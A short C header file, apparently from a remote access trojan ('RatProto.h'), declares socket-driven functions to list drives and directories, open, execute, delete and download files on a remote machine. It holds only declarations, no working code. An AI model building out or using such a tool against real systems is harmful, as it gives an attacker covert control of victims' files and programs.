#include "Header.h"
#include "RatProto.h"

#define PERSENDBYTES 10000

struct FileArgs{
	SOCKET sockfd;
	HANDLE hFile;
};

#define FILENUMS	100

//列盘符
BOOL DriveList(SOCKET sockfd);
//打开指定文件
BOOL FileOpen(SOCKET sockfd,int dwSize);
//执行EXE文件
BOOL FileExcute(SOCKET sockfd,int dwSize);
//文件夹回溯
BOOL FileBack(SOCKET sockfd,int dwSize);
//删除文件
BOOL FileDelete(SOCKET sockfd,int dwSize);
//下载文件
BOOL FileDownload(SOCKET sockfd,int dwSize);
//传输文件线程函数
void FileTransmit(LPVOID fa);
//列目录文件
BOOL FileList(SOCKET sockfd,char* szPath);